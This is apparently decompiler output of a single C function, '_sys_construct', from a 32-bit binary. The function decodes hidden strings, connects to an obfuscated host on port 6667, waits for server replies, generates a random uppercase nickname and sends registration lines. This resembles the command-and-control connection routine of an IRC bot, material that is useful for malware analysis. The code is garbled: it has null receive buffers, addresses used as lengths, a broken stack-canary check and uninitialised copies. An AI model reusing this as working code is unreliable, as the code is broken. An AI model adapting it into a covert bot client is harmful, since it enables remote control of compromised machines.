
// Address range: 0x8048aea - 0x8048f77
int32_t _sys_construct(void) {
    // 0x8048aea
    int32_t v1;
    int32_t v_4412 = v1; // bp-4412
    int32_t v2;
    int32_t v_4400 = v2; // bp-4400
    int32_t v3;
    int32_t v_4396 = v3; // bp-4396
    int32_t v4;
    int32_t v_4382 = v4; // bp-4382
    int32_t v5;
    int32_t v_4376 = v5; // bp-4376
    int32_t v6;
    int32_t v_4370 = v6; // bp-4370
    int32_t v7;
    int32_t v_4361 = v7; // bp-4361
    int32_t v8;
    int32_t v_4343 = v8; // bp-4343
    int32_t v9;
    int32_t v_4320 = v9; // bp-4320
    int32_t v10;
    int32_t v_4240 = v10; // bp-4240
    int32_t v11;
    int32_t v_4128 = v11; // bp-4128
    int32_t v12;
    int32_t v_2080 = v12; // bp-2080
    int32_t v13;
    int32_t v14 = v13;
    int32_t v15;
    int32_t v16 = v15; // bp+19
    int32_t v17;
    int32_t v18 = v17; // bp+28
    int32_t v19;
    int32_t v_134518883 = v19; // 0x134518883
    int32_t v20;
    int32_t v_134518977 = v20; // 0x134518977
    int32_t v_8048af0_3 = (int32_t)&v_4412; // 0x8048af0_3

    v_4370 = 0x7C;
    v_4376 = 0x3D;
    v_4361 = 0x49;
    char * v_4323 = (char *)0x50475157; // bp-4323
    memcpy((char *)&v_4320, (char *)&v_134518883, (int32_t)&v16);
    int32_t v_4241 = 0x31363035; // bp-4241
    memcpy((char *)&v_4240, (char *)&v_134518977, (int32_t)&v18);
    v_4343 = 0x5D;
    _sys_hash(0x3F, (char *)&v_4370);
    _sys_hash(0x7B, (char *)&v_4376);
    _sys_hash(0x2A, (char *)&v_4361);
    _sys_hash(0x02, (char *)&v_4323);
    _sys_hash(0x7F, (char *)&v_4241);
    _sys_hash(0x18, (char *)&v_4343);

    // The primitive for creating a socket is the socket function, declared in sys/socket.h.
    // Function: int socket (int namespace, int style, int protocol)
    int32_t v_8048d61 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x8048d61

    struct hostent * v_8048d79 = gethostbyname((char *)&v_4361); // 0x8048d79
    int32_t v_8048d81 = *(int32_t *)((int32_t)v_8048d79 + 12); // 0x8048d81
    struct hostent * v_8048d90 = gethostbyname((char *)&v_4361); // 0x8048d90
    int32_t v_8048d98 = *(int32_t *)((int32_t)v_8048d90 + 16); // 0x8048d98
    int32_t v_8048d9b = *(int32_t *)v_8048d98; // 0x8048d9b
    memcpy((char *)&v_4396, (char *)v_8048d9b, v_8048d81);
    v_4400 = 2;

    htons(0x1a0b);
    char * v21 = (char *)v_8048d61;
    
    //int connect(int socket, const struct sockaddr *address, socklen_t address_len);
    connect(v_8048d61, (struct sockaddr *)&v_4400, 16);
    int32_t v_8048e16_0 = (int32_t)&v_2080; // 0x8048e16_0
    int32_t * v_8048df0_0 = (int32_t *)(v_8048af0_3 - 4); // 0x8048df0_0
    int32_t * v_8048df2_0 = (int32_t *)(v_8048af0_3 - 8); // 0x8048df2_0
    int32_t * v_8048dfd_0 = (int32_t *)(v_8048af0_3 - 12); // 0x8048dfd_0
    int32_t * v_8048dfe_0 = (int32_t *)(v_8048af0_3 - 16); // 0x8048dfe_0
    int32_t * v_8048e04_1 = (int32_t *)(v_8048af0_3 - 20); // 0x8048e04_1
    char * v_8048e1d108 = strstr((char *)&v_2080, (char *)&v_4370); // 0x8048e1d108
    int32_t v_8048ea3; // 0x8048ea3
    int32_t v_8048f35; // 0x8048f35
    int32_t v_8048e93_0; // 0x8048e93_0
    int32_t v_8048e4b; // 0x8048e4b
    int32_t v_8048e6b; // 0x8048e6b
    char * v_8048f4e; // 0x8048f4e
    char * v_8048f4e72; // 0x8048f4e72
    int32_t v22;
    int32_t v_8048f63; // 0x8048f63
    if (v_8048e1d108 != NULL) {
        // 0x8048e46
        v_8048e4b = time(NULL);
        srand(v_8048e4b);
        v_8048e93_0 = (int32_t)&v_4382;
        v22 = 0;
        v_8048e6b = rand();
        *(char *)(v22 + v_8048e93_0) = (char)(v_8048e6b % 26 + 65);
        v_8048ea3 = v22 + 1;
        // branch -> 0x8048e6b
        while (v_8048ea3 < 6) {
            // 0x8048e6b
            v22 = v_8048ea3;
            v_8048e6b = rand();
            *(char *)(v22 + v_8048e93_0) = (char)(v_8048e6b % 26 + 65);
            v_8048ea3 = v22 + 1;
            // continue -> 0x8048e6b
        }
        // 0x8048eb3
        sprintf((char *)&v_4128, (char *)&v_4323);
        _sys_send(v21, (char *)&v_4128);
        _sys_send(v21, (char *)&v_4241);
        v_8048f4e72 = strstr((char *)&v_2080, (char *)&v_4343);
        if (v_8048f4e72 != NULL) {
            // 0x8048f5a
            v_8048f63 = *(int32_t *)20;
            if (v_8048f63 != 20) {
                // 0x8048f6b
                __stack_chk_fail();
                // branch -> 0x8048f70
            }
            // 0x8048f70
            return 0;
        }
        *v_8048df0_0 = 0;
        *v_8048df2_0 = 2048;
        *v_8048dfd_0 = v_8048e16_0;
        *v_8048dfe_0 = v_8048d61;
        *v_8048e04_1 = 0x8048f3a;
        v_8048f35 = v14;
        recv(v_8048f35, NULL, 0, 0);
        v_8048f4e = strstr((char *)&v_2080, (char *)&v_4343);
        while (v_8048f4e == NULL) {
            // 0x8048f21
            *v_8048df0_0 = 0;
            *v_8048df2_0 = 2048;
            *v_8048dfd_0 = v_8048e16_0;
            *v_8048dfe_0 = v_8048d61;
            *v_8048e04_1 = 0x8048f3a;
            v_8048f35 = v14;
            recv(v_8048f35, NULL, 0, 0);
            v_8048f4e = strstr((char *)&v_2080, (char *)&v_4343);
            // continue -> 0x8048f21
        }
        // 0x8048f5a
        v_8048f63 = *(int32_t *)20;
        if (v_8048f63 != 20) {
            // 0x8048f6b
            __stack_chk_fail();
            // branch -> 0x8048f70
        }
        // 0x8048f70
        return 0;
    }
    while (true) {
        char * v_8048e3a = strstr((char *)&v_2080, (char *)&v_4376); // 0x8048e3a
        if (v_8048e3a == NULL) {
            // 0x8048df0
            *v_8048df0_0 = 0;
            *v_8048df2_0 = 2048;
            *v_8048dfd_0 = v_8048e16_0;
            *v_8048dfe_0 = v_8048d61;
            *v_8048e04_1 = 0x8048e09;
            int32_t v_8048e04 = v14; // 0x8048e04
            recv(v_8048e04, NULL, 0, 0);
            char * v_8048e1d = strstr((char *)&v_2080, (char *)&v_4370); // 0x8048e1d
            if (v_8048e1d != NULL) {
                // break -> 0x8048e46
                break;
            }
            // continue -> 0x8048e29
            continue;
        }
    }
    // 0x8048e46
    v_8048e4b = time(NULL);
    srand(v_8048e4b);
    v_8048e93_0 = (int32_t)&v_4382;
    v22 = 0;
    v_8048e6b = rand();
    *(char *)(v22 + v_8048e93_0) = (char)(v_8048e6b % 26 + 65);
    v_8048ea3 = v22 + 1;
    // branch -> 0x8048e6b
    while (v_8048ea3 < 6) {
        // 0x8048e6b
        v22 = v_8048ea3;
        v_8048e6b = rand();
        *(char *)(v22 + v_8048e93_0) = (char)(v_8048e6b % 26 + 65);
        v_8048ea3 = v22 + 1;
        // continue -> 0x8048e6b
    }
    // 0x8048eb3
    sprintf((char *)&v_4128, (char *)&v_4323);
    _sys_send(v21, (char *)&v_4128);
    _sys_send(v21, (char *)&v_4241);
    v_8048f4e72 = strstr((char *)&v_2080, (char *)&v_4343);
    if (v_8048f4e72 != NULL) {
        // 0x8048f5a
        v_8048f63 = *(int32_t *)20;
        if (v_8048f63 != 20) {
            // 0x8048f6b
            __stack_chk_fail();
            // branch -> 0x8048f70
        }
        // 0x8048f70
        return 0;
    }
    *v_8048df0_0 = 0;
    *v_8048df2_0 = 2048;
    *v_8048dfd_0 = v_8048e16_0;
    *v_8048dfe_0 = v_8048d61;
    *v_8048e04_1 = 0x8048f3a;
    v_8048f35 = v14;
    recv(v_8048f35, NULL, 0, 0);
    v_8048f4e = strstr((char *)&v_2080, (char *)&v_4343);
    while (v_8048f4e == NULL) {
        // 0x8048f21
        *v_8048df0_0 = 0;
        *v_8048df2_0 = 2048;
        *v_8048dfd_0 = v_8048e16_0;
        *v_8048dfe_0 = v_8048d61;
        *v_8048e04_1 = 0x8048f3a;
        v_8048f35 = v14;
        recv(v_8048f35, NULL, 0, 0);
        v_8048f4e = strstr((char *)&v_2080, (char *)&v_4343);
        // continue -> 0x8048f21
    }
    // 0x8048f5a
    v_8048f63 = *(int32_t *)20;
    if (v_8048f63 != 20) {
        // 0x8048f6b
        __stack_chk_fail();
        // branch -> 0x8048f70
    }
    // 0x8048f70
    return 0;
}